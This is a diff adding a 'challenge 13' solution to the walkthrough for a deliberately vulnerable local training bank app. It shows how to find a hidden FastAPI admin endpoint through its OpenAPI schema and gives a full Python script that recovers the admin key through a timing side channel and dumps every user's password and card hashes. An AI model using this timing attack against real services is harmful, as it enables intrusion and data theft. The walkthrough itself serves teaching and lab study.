@@ -5,7 +5,8 @@ step by step, with exact payloads.** If you're treating this like a CTF,
 stop here and use `Hackers.md` instead. This document exists for anyone
 studying the app, teaching from it, or genuinely stuck.
 
-Server assumed running at `http://127.0.0.1:5005/`. Scoreboard/flag
+Server assumed running at `http://127.0.0.1:5005/` (via `./run.sh`, which
+also starts the second automation API challenge 13 needs). Scoreboard/flag
 tracking is per-session (a cookie), so solving something in one browser
 tab/`curl` cookie jar won't show as solved in another.
 
@@ -359,6 +360,86 @@ instead — that's expected, not a shortcut around anything, and it
 doesn't mark this specific challenge solved (only a token that was
 never actually issued by the server does, tracked via the
 `issued_tokens` table).
+
+---
+
+## 13. Dump the Entire Database via the Newer API (★★★★★)
+
+`/api/login`/`/api/balance` (challenge 12) aren't the only automation API
+anymore — `/api/login`'s own JSON response now says so ("This API is
+deprecated in favor of a newer automation API"). The newer one is a
+genuinely separate process (`new_api.py`, FastAPI, bound to
+`127.0.0.1:8000`), reachable only through a proxy route on the main app:
+`/<anything>/new/api/<path>` — the first path segment is decorative, it can
+be literally anything.
+
+**Step 1 — find the endpoints.** FastAPI auto-generates an OpenAPI schema
+at `/openapi.json`, and the proxy forwards that subpath through just like
+any other:
+
+```
+curl http://127.0.0.1:5005/x/new/api/openapi.json
+```
+
+This lists all three routes (`/login`, `/balance`, `/admin/dump`) and, in
+`components.securitySchemes`, the exact header `/admin/dump` wants:
+`X-Admin-Key`. No source access needed.
+
+**Step 2 — notice `/login`/`/balance` are actually fine.** They issue a
+real, random, server-side-tracked token — not a JWT, not forgeable. Log in
+normally if you want (`POST /x/new/api/login` with real credentials), but
+it gets you nowhere near `/admin/dump`.
+
+**Step 3 — the actual bug.** `/admin/dump` checks `X-Admin-Key` with a
+hand-rolled character-by-character comparison instead of
+`secrets.compare_digest` (see `_leaky_compare` in `new_api.py`) — it
+returns as soon as it hits a wrong character. A guess sharing a longer
+correct prefix with the real 16-character hex key takes measurably longer
+to get rejected than one that doesn't (the comparison has a small
+deliberate delay per confirmed-correct character, so the difference is
+easy to measure over HTTP instead of needing nanosecond-level statistics).
+Recover it one position at a time:
+
+```python
+import time, requests
+
+BASE = 'http://127.0.0.1:5005'
+s = requests.Session()
+
+URL = f'{BASE}/x/new/api/admin/dump'
+CHARSET = '0123456789abcdef'
+KEY_LEN = 16
+SAMPLES = 3  # per guess, keep the fastest to cut network jitter
+
+def timed(key):
+    best = float('inf')
+    for _ in range(SAMPLES):
+        t0 = time.perf_counter()
+        s.get(URL, headers={'X-Admin-Key': key}, timeout=5)
+        best = min(best, time.perf_counter() - t0)
+    return best
+
+known = ''
+for pos in range(KEY_LEN):
+    best_char, best_time = None, -1
+    for c in CHARSET:
+        guess = known + c + '0' * (KEY_LEN - len(known) - 1)  # pad to real length -
+        t = timed(guess)                                       # wrong-length guesses
+        if t > best_time:                                      # reject instantly, no signal
+            best_time, best_char = t, c
+    known += best_char
+    print(f'position {pos}: {best_char!r} ({best_time*1000:.1f}ms) -> {known}')
+
+print('recovered key:', known)
+print(s.get(URL, headers={'X-Admin-Key': known}).json())
+```
+
+Takes roughly a minute or two (256 guesses × 3 samples, most rejected
+almost immediately, the last few positions of each guess costing the most
+time). The final request returns every user's password hash and every
+credit card hash in the bank — game over. Use the same `requests.Session()`
+throughout (as above) so the session cookie that flips this challenge
+solved on the scoreboard carries through to the winning request.
 
 ---
 
